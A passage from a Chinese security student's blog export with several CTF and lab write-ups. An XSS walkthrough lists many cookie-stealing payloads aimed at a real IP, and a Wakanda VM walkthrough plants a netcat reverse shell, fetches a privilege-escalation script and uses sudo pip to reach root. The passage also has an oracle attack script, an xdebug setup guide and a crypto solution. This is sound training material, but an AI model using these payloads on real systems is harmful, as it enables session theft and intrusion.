post soon.'</span>) == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># check if all posts were removed or not after 5 seconds</span></span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">        url = <span class="string">'https://jail.2019.rctf.rois.io/'</span></span><br><span class="line">        resp = req.get(url, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># resp.text.find('Log-in to your account') != -1:</span></span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">302</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">elif</span> resp.text.find(post_id) == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># save result and continue to next bit</span></span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> attack(i, j, tries+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_to_str</span><span class="params">(s)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s)<span class="number">-7</span>, <span class="number">8</span>):</span><br><span class="line">        v = <span class="string">'0b'</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">            v += s[i+j]</span><br><span class="line"></span><br><span class="line">        ret += chr(int(v, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    cipher = <span class="string">'md5'</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        key = sys.argv[<span class="number">1</span>]</span><br><span class="line">        x = break_hash(cipher, key)</span><br><span class="line">        print(x)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="string">''</span></span><br><span class="line">        istart = len(s) // <span class="number">8</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(istart, <span class="number">400</span>):</span><br><span class="line">            jstart = len(s) % <span class="number">8</span></span><br><span class="line">            <span class="keyword">if</span> jstart == <span class="number">0</span>:</span><br><span class="line">                s += <span class="string">'0'</span></span><br><span class="line">                jstart += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(jstart, <span class="number">8</span>):</span><br><span class="line">                s += str(attack(i, j))</span><br><span class="line">                print(<span class="string">'[*] s = %s'</span> % s)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">'[*]'</span>)</span><br><span class="line">            print(<span class="string">'[*] flag is %s'</span> % repr(bin_to_str(s)))</span><br><span class="line">            print(<span class="string">'[*]'</span>)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">'[*] s = %s'</span> % s)</span><br><span class="line">        print(<span class="string">'[*] flag is %s'</span> % repr(bin_to_str(s)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>xss-thousand-knocks</title>
    <url>/2019/04/22/xss-thousand-knocks/</url>
    <content><![CDATA[<h1>XSS-thousands-knocks</h1>
<p>before starting the test, connect to our vps and excute:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvkp 1234</span><br><span class="line"> l:listen;v:print information;vv:print information in detail;k:keep connecting;p:port</span><br></pre></td></tr></table></figure>
<h2 id="stage-1">stage 1</h2>
<p>just click the link and get the flag</p>
<h2 id="stage-2">stage 2</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="stage-3">stage 3</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&quot;&gt;&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="stage-4">stage 4</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&apos;&apos;&gt;&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="stage-5">stage 5</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;/textarea&gt;&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="stage-6">stage 6</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;/xmp&gt;&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="stage-7">stage 7</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=xss&quot;+autofocus+onfocus=&quot;document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`</span><br></pre></td></tr></table></figure>
<h2 id="stage-8">stage 8</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=xss&apos;+autofocus+onfocus=&apos;document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`</span><br></pre></td></tr></table></figure>
<h2 id="stage-9">stage 9</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=xss+autofocus+onfocus=document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`</span><br></pre></td></tr></table></figure>
<h2 id="stage-10-11">stage 10 &amp; 11</h2>
<blockquote>
<p>真协议用来在计算机之间传输数据包，如 http 协议，ftp 协议；伪协议是一种非标准化的协议，让使用者可以通过链接来调用 js 函数。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=javascript:document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`</span><br></pre></td></tr></table></figure>
<h2 id="stage-12">stage 12</h2>
<blockquote>
<p>CSP contains ‘unsafe-inline’</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=javascript:var xss=document.createlement(`link`);xss.setAttribute(`rel`,`prefetch`);xss.setAttribute(`href`,`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`);document.head.appendChild(xss);</span><br><span class="line">//页面渲染完毕会创建 Link REL=prefetch 的标签，向目标页面发起预加载</span><br></pre></td></tr></table></figure>
<h2 id="stage-13">stage 13</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q= &lt;svg onload=eval(atob(&apos;ZG9jdW1lbnQubG9jYXRpb249YGh0dHA6Ly8yMDcuMTQ4LjY0LjEyNDoxMjM0Lz8ke2RvY3VtZW50LmNvb2tpZX1g&apos;))&gt;</span><br><span class="line">//base64.b64encode(&apos;document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`&apos;)</span><br></pre></td></tr></table></figure>
<h2 id="stage-14">stage 14</h2>
<blockquote>
<p>CSP:frame-src http://*.knock.xss.moe</p>
</blockquote>
<p>using other stage to get the flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=XSS%20autofocus%20onfocus=document.domain=`knock.xss.moe`;window.open(`http://207.148.64:1234/?$&#123;parent.document.cookie&#125;`)</span><br><span class="line"></span><br><span class="line">//attention to &apos;domain=`knock.xss.moe`&apos; and &apos;parent.document.cookie&apos;</span><br></pre></td></tr></table></figure>
<h2 id="stage-15">stage 15</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;svg onload=document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`&gt;</span><br></pre></td></tr></table></figure>
<h2 id="stage-16-17">stage 16 &amp; 17</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=javascript:document.location=`http://207.148.64.125:1234/?$&#123;parent.document.cookie&#125;`</span><br></pre></td></tr></table></figure>
<h2 id="stage-18">stage 18</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=\%27);window.open(`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`)//</span><br><span class="line">q=\%27);window.open(`http://207.148.64.125:1234/?`%2bdocument.cookie)//</span><br></pre></td></tr></table></figure>
<h2 id="stage-19">stage 19</h2>
<blockquote>
<p>you can eval function in alert()</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=xxs&apos;,window.open(`http://207.148.74.125:1234/?$&#123;document.cookie&#125;`));//</span><br></pre></td></tr></table></figure>
<h2 id="stage-20">stage 20</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;scrscriptipt&gt;document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure>
<h2 id="stage-21">stage 21</h2>
<blockquote>
<p>x-xss-protection:1;mode=block;,这里使用了XSS过滤，如果检测到攻击，就会浏览器会阻止页面渲染</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;sCript&gt;docuscriptment.locscriptation=`http://url/?$&#123;document.cookie&#125;`&lt;/sCript&gt;</span><br></pre></td></tr></table></figure>
<h2 id="stage-22">stage 22</h2>
<blockquote>
<p>length limit: consider <svg> first,and replace http:// to //,and convert ip to desimalism</svg></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;svg/onload=window.open(`//url(desimalism)/?$&#123;document.cookie&#125;`)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="stage-23-24">stage 23 &amp; 24</h2>
<blockquote>
<p>location.hash:get the anchor point(the content after ‘#’) , which can be used to bypass the length limit</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;svg/onload=eval(location.hash.slice(1))&gt;#window.open(`//url/?$&#123;document.cookie&#125;`)</span><br></pre></td></tr></table></figure>
<h2 id="stage-25">stage 25</h2>
<p>this is extremely short…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">the index.php on my vps :</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.name=&quot;location.href=`url/?$&#123;parent.document.cookie&#125;`&quot;;</span><br><span class="line">location.href = &quot;http://8e67e39d7e01213d5551c696ef8641b625cc8dd7.knock.xss.moe/?q=&lt;svg/onload=eval(window.name)&gt;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">and followed by :</span><br><span class="line">http://2017.148.64.125/index.php</span><br></pre></td></tr></table></figure>
<h2 id="stage-26">stage 26</h2>
<p>会把输入字符全部大写化，原先的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/?q=&lt;img src=&quot;x&quot; onerror=window.open(`http://134.175.33.164:1234/?$&#123;document.cookie&#125;`)&gt;</span><br></pre></td></tr></table></figure>
<p>将其进行html实体编码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/?q=&lt;img src=&quot;x&quot; onerror=&amp;#x77;&amp;#x69;&amp;#x6e;&amp;#x64;&amp;#x6f;&amp;#x77;&amp;#x2e;&amp;#x6f;&amp;#x70;&amp;#x65;&amp;#x6e;&amp;#x28;&amp;#x60;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x31;&amp;#x33;&amp;#x34;&amp;#x2e;&amp;#x31;&amp;#x37;&amp;#x35;&amp;#x2e;&amp;#x33;&amp;#x33;&amp;#x2e;&amp;#x31;&amp;#x36;&amp;#x34;&amp;#x3a;&amp;#x31;&amp;#x32;&amp;#x33;&amp;#x34;&amp;#x2f;&amp;#x3f;&amp;#x24;&amp;#x7b;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x7d;&amp;#x60;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure>
<p>为了防止井号被当作是锚点，将其进行urlencode</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/?q=&lt;img src=&quot;x&quot; onerror=%26%23%78%37%37%3b%26%23%78%36%39%3b%26%23%78%36%65%3b%26%23%78%36%34%3b%26%23%78%36%66%3b%26%23%78%37%37%3b%26%23%78%32%65%3b%26%23%78%36%66%3b%26%23%78%37%30%3b%26%23%78%36%35%3b%26%23%78%36%65%3b%26%23%78%32%38%3b%26%23%78%36%30%3b%26%23%78%36%38%3b%26%23%78%37%34%3b%26%23%78%37%34%3b%26%23%78%37%30%3b%26%23%78%33%61%3b%26%23%78%32%66%3b%26%23%78%32%66%3b%26%23%78%33%31%3b%26%23%78%33%33%3b%26%23%78%33%34%3b%26%23%78%32%65%3b%26%23%78%33%31%3b%26%23%78%33%37%3b%26%23%78%33%35%3b%26%23%78%32%65%3b%26%23%78%33%33%3b%26%23%78%33%33%3b%26%23%78%32%65%3b%26%23%78%33%31%3b%26%23%78%33%36%3b%26%23%78%33%34%3b%26%23%78%33%61%3b%26%23%78%33%31%3b%26%23%78%33%32%3b%26%23%78%33%33%3b%26%23%78%33%34%3b%26%23%78%32%66%3b%26%23%78%33%66%3b%26%23%78%32%34%3b%26%23%78%37%62%3b%26%23%78%36%34%3b%26%23%78%36%66%3b%26%23%78%36%33%3b%26%23%78%37%35%3b%26%23%78%36%64%3b%26%23%78%36%35%3b%26%23%78%36%65%3b%26%23%78%37%34%3b%26%23%78%32%65%3b%26%23%78%36%33%3b%26%23%78%36%66%3b%26%23%78%36%66%3b%26%23%78%36%62%3b%26%23%78%36%39%3b%26%23%78%36%35%3b%26%23%78%37%64%3b%26%23%78%36%30%3b%26%23%78%32%39%3b&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>xman2019</title>
    <url>/2019/08/21/xman2019%E5%BF%83%E5%BE%97%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>20多天的夏令营生活,见识了很多, 也对自己的实力有了一个较为清晰的定位(菜的一匹). 几次和rois的大佬交流, 深觉开发能力之重要, 进而又觉自己效率过低, 需要警戒啊.很多时候, 出一道题比做一道题让人收获更多.</p>
<p>不过学习一个开发框架, 也不一定非得从头到尾照着官方文档打一遍, 仅仅只是从头到尾过一遍, 快速摸清骨架, 查找相关的安全问题, 也不失为是一个锻炼快速学习能力的好机会.</p>
<p>复现方面, 自己也不能像以前一样一定要把每一道题目都要从头到尾搭建环境然后在每一个解题细节上纠结半天. 效率实在是太差, 也该会提纲挈领了.</p>
<p>从xman入营以来, 我一直都在忙着复现xctf的赛事, 但是从头复现, 实在是繁琐. 根本跟不上进度, 更不要说我还想回过头去复习以前的题目呢.这个时候就觉得知识点总结性的备忘录实在是重要, 每次做完题目之后, 取其精华, 纳入其中, 回过头去只需要两眼三眼就可以复习,反观自己之前的&quot;错题本&quot;, 其中的冗余之多, 我都想删了他.</p>
<p>工具方面, 很遗憾,但是不后悔的, 从linux主系统换回了windows, 回想之前为什么会折腾系统, 大概是自己没有把精力全部放在做题和提高自己吧,想到这里,更觉得惭愧.以后除非刚需, 否则再也不会去折腾一些配置了.</p>
<p>另外, 在这次夏令营, 不论哪位讲师, 都在强调快速学习的能力. 我感觉之前一年的努力方向出了差错, 只是在低效地扩宽自己的知识面但是不注重提高自己快速学习的能力.</p>
]]></content>
  </entry>
  <entry>
    <title>Wakanda靶机渗透</title>
    <url>/2019/04/22/Wakanda%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>首先发现主机：<code>netdiscover</code>或者<code>arp-scan -l</code>，发现靶机</p>
<p>然后<code>nmap -sS -p- (victim_url)</code>，开放的端口有80，111，3333.<br>
访问以下80端口，源码中有一行注释：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--herf=&quot;?lang=fr&quot;--&gt;</span><br></pre></td></tr></table></figure>
<p>尝试给访问<code>url/?lang=fr</code>，发现页面的语言变成了法语。考虑文件包含，访问<code>url/?lang=php://filter/read=convert.base64-encode/resource=index</code>(index和index.php都要试一下)。<br>
解码之后得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password =<span class="string">"Niamey4Ever227!!!"</span> ;<span class="comment">//I have to remember it</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'lang'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'lang'</span>].<span class="string">".php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里有一个密码，然后在之前的网页中，可以看见最下方有一个用户名，尝试用这个用户名和密码去ssh登陆。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh mamadou@(url) -p 3333</span><br></pre></td></tr></table></figure>
<p>然后输入密码就可以连接进入靶机了。进入之后发现是一个python的交互界面，这个时候可以调用<code>pty</code>库来进入交互式的<code>shell</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawm(<span class="string">"/bin/bash"</span>)</span><br></pre></td></tr></table></figure>
<p>这样子我们就来到了bash，并拿到了第一个flag，尝试使用命令<code>sudo -l</code>来查看当前用户<code>所能执行的root用户命令</code>，结果并没有可执行的root命令。查看有没有其他用户(可以通过查看<code>/etc/passwd</code>或者<code>/home</code>目录下的用户得知用户信息)。发现有一个叫做<code>devops</code>的用户，通过<code>find / -user devops 2&gt;/dev/null</code>来发现<code>devops</code>的文件，发现第二个flag，同时还有一个<code>.antivirus.py</code>文件。</p>
<p>进入发现源代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">open(<span class="string">'/tmp/test'</span>,<span class="string">'w'</span>).write(<span class="string">'test'</span>)</span><br></pre></td></tr></table></figure>
<p>我们将那个test文件删掉之后过一段时间又会出现，然后结合py的文件名，可以推测这个脚本会隔一段时间执行一次。<br>
那么我们可以利用这个来反弹shell。改写改py文件如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">"nc (my_host) -p 4444 -e '/bin/bash' -i"</span>)</span><br></pre></td></tr></table></figure>
<p>然后其他的writeup中是这样利用的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python lhost=192.168.43.242 lport=4444 R</span><br></pre></td></tr></table></figure>
<p>然后把生成的<code>poc</code>写进py文件中来。<br>
然后在自己的攻击机上开启nc,<code>nc -lvp 4444</code>由于py文件执行的时候，执行的身份是<code>devops</code>所以我们得到的是devops的shell，可以查看第二个flag的内容了。</p>
<p>然后<code>sudo -l</code>查看该用户可用的管理员命令，发现一个<code>pip</code>可以执行，然后有一个<code>Fakepip</code>的脚本可以利用，在攻击机上把脚本给下载过来，然后在脚本目录下运行<code>sudo python -m SimpleHttpServer 80</code>来运行简单的<code>python http</code>服务，然后在靶机上运行<code>wget http://(attacker url)/setup.py</code>来把Fakepip中的setup脚本传输过去。记得在传输之前修改setup脚本中的lhost和lport，<a href="http://xn--setup-4n1h846arhg5r4bh4ut71dw3sgxw.py" target="_blank" rel="noopener">然后在靶机中运行setup.py</a>，同时在攻击机上面运行<code>nc -lvp 4444</code>接受shell，然后就得到了root权限</p>
]]></content>
      <categories>
        <category>靶机渗透</category>
      </categories>
  </entry>
  <entry>
    <title>使用vscode和xdebug实现远程调试虚拟机中的php项目</title>
    <url>/2019/12/16/vscode-vmware-xdebug/</url>
    <content><![CDATA[<blockquote>
<p><s>为了避开windows下debug时候可能出现的怪异问题, 我花了一个晚上搭建了xdebug+vscode的远程调试环境, 特此记录</s></p>
<p>vscode的php调试插件有坑, 还是用phpstorm吧</p>
</blockquote>
<h2 id="requirement">requirement</h2>
<ul>
<li>client
<ul>
<li>vscode</li>
<li>vscode plugin: php debug</li>
<li>firefox(chrome) xdebug plugin</li>
</ul>
</li>
<li>Server
<ul>
<li>xdebug</li>
</ul>
</li>
</ul>
<h2 id="Installation">Installation</h2>
<h3 id="xdebug">xdebug</h3>
<p>在kali上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install php-pear</span><br><span class="line">apt install php-dev</span><br><span class="line">pecl install xdebug</span><br></pre></td></tr></table></figure>
<p>在/etc/php/7.3/apache2/php.ini中添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension=/usr/lib/php/20180731/xdebug.so</span><br><span class="line">xdebug.remote_enable = true</span><br><span class="line">xdebug.remote_autostart = true</span><br><span class="line">xdebug.remote_host = 192.168.75.1</span><br><span class="line">xdebug.remote_port = 9000</span><br><span class="line">xdebug.remote_log = /var/log/xdebug.log</span><br><span class="line">xdebug.max_nesting_level = 1000</span><br></pre></td></tr></table></figure>
<p>remote_host填写主机url, 然后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service apache2 restart</span><br></pre></td></tr></table></figure>
<p>然后通过phpinfo来检查xdebug是否已经启用</p>
<h3 id="vscode">vscode</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctrl+alt+p 打开launch.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    // Use IntelliSense to learn about possible attributes.</span><br><span class="line">    // Hover to view descriptions of existing attributes.</span><br><span class="line">    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span><br><span class="line">    &quot;version&quot;: &quot;0.2.0&quot;,</span><br><span class="line">    &quot;configurations&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Listen for XDebug&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;php&quot;,</span><br><span class="line">            &quot;pathMappings&quot;: &#123;</span><br><span class="line">                &quot;/var/www/html/cms/tp6x&quot;: &quot;C:\\Users\\ch4ser__\\Desktop\\vscode_workspace\\tp6x&quot;,</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">            &quot;port&quot;: 9000,</span><br><span class="line">            &quot;log&quot;: true,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Launch currently open script&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;php&quot;,</span><br><span class="line">            &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">            &quot;program&quot;: &quot;$&#123;file&#125;&quot;,</span><br><span class="line">            &quot;cwd&quot;: &quot;$&#123;fileDirname&#125;&quot;,</span><br><span class="line">            &quot;port&quot;: 9000</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>pathmapping 中, 服务器的web项目路径和本地主机的web项目路径要一致.</p>
<p>这样就可以了</p>
<h2 id="使用">使用</h2>
<p>两个路径下都是一样的代码, 在vscode中下断点, 启动Listen for XDebug模式, 浏览器插件启动xdebug模式 并访问服务器的web路径, 这个时候vscode就到了断点处</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70918588-42516f00-205a-11ea-8d71-7da8fce60950.png" alt="image"></p>
]]></content>
  </entry>
  <entry>
    <title>TokyoWestern2019</title>
    <url>/2019/09/04/TokyoWestern2019/</url>
    <content><![CDATA[<h1>Crypto</h1>
<h2 id="simple-logic">simple logic</h2>
<p>题目给出了加密脚本</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'securerandom'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"></span><br><span class="line">ROUNDS = <span class="number">765</span></span><br><span class="line">BITS = <span class="number">128</span></span><br><span class="line">PAIRS = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(msg, key)</span></span></span><br><span class="line">    enc = msg</span><br><span class="line">    mask = (<span class="number">1</span> &lt;&lt; BITS) - <span class="number">1</span></span><br><span class="line">    ROUNDS.times <span class="keyword">do</span></span><br><span class="line">        enc = (enc + key) &amp; mask</span><br><span class="line">        enc = enc ^ key</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    enc</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(msg, key)</span></span></span><br><span class="line">    enc = msg</span><br><span class="line">    mask = (<span class="number">1</span> &lt;&lt; BITS) - <span class="number">1</span></span><br><span class="line">    ROUNDS.times <span class="keyword">do</span></span><br><span class="line">        enc = enc ^ key</span><br><span class="line">        enc = (enc - key) &amp; mask</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    enc</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">fail <span class="keyword">unless</span> BITS % <span class="number">8</span> == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">flag = SecureRandom.bytes(BITS / <span class="number">8</span>).unpack1(<span class="string">'H*'</span>).to_i(<span class="number">16</span>)</span><br><span class="line">key = SecureRandom.bytes(BITS / <span class="number">8</span>).unpack1(<span class="string">'H*'</span>).to_i(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">STDERR.puts <span class="string">"The flag: TWCTF&#123;%x&#125;"</span> % flag</span><br><span class="line">STDERR.puts <span class="string">"Key=%x"</span> % key</span><br><span class="line">STDOUT.puts <span class="string">"Encrypted flag: %x"</span> % encrypt(flag, key)</span><br><span class="line">fail <span class="keyword">unless</span> decrypt(encrypt(flag, key), key) == flag <span class="comment"># Decryption Check</span></span><br><span class="line"></span><br><span class="line">PAIRS.times <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">    plain = SecureRandom.bytes(BITS / <span class="number">8</span>).unpack1(<span class="string">'H*'</span>).to_i(<span class="number">16</span>)</span><br><span class="line">    enc = encrypt(plain, key)</span><br><span class="line">    STDOUT.puts <span class="string">"Pair %d: plain=%x enc=%x"</span> % [-~i, plain, enc]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>随后给出了加密过后的flag以及随机产生的六组明文和对应的六组密文.</p>
<p>加密过程就是明文和key相加之后在和key进行一次异或, 这个过程重复765次. 很明显我们要求key来解出flag</p>
<p>原理很简单:在这个加密过程中, 低位会影响高位的加密(比如明文的低位和key的低位相加之后会向高位进行进位) 但是不会影响低位本身的加密, 同时高位也不会影响到低位的加密, 因此只要从低位开始一位一位爆破就可以了. 要求已知key的部分和每一组明文中对应的那一部分经过756轮加密之后和密文对应部分一致.</p>
<p>比如</p>
<blockquote>
<p>猜测key的最后一位是1, 和六组明文中每一组的最后一位都分别加密756次, 有六个密文位, 如果和那六组密文的最后一位对应那就可能是key的一部分, 之所以说可能是因为在考虑位数较少的情况下可能存在多种解的情况.</p>
<p>猜测倒数第二位 01或者是11 , 这两个可能都去和六组明文中每一组的最后两位都分别加密756次, 有六个密文位, 如果和那六组密文的最后两位对应那就可能是key的一部分.由此类推…</p>
</blockquote>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROUNDS = <span class="number">765</span></span><br><span class="line">BITS = <span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(msg,key)</span>:</span></span><br><span class="line">    enc = msg</span><br><span class="line">    mask = (<span class="number">1</span> &lt;&lt; BITS) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(ROUNDS):</span><br><span class="line">        enc = (enc + key) &amp; mask</span><br><span class="line">        enc = enc ^ key</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(msg, key)</span>:</span></span><br><span class="line">    enc = msg</span><br><span class="line">    mask = (<span class="number">1</span> &lt;&lt; BITS) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(ROUNDS):</span><br><span class="line">        enc = enc ^ key</span><br><span class="line">        enc = (enc - key) &amp; mask</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">the_flag = <span class="number">0x43713622de24d04b9c05395bb753d437</span></span><br><span class="line"></span><br><span class="line">plain = [<span class="number">0x29abc13947b5373b86a1dc1d423807a</span>,<span class="number">0xeeb83b72d3336a80a853bf9c61d6f254</span>,<span class="number">0x7a0e5ffc7208f978b81475201fbeb3a0</span>,<span 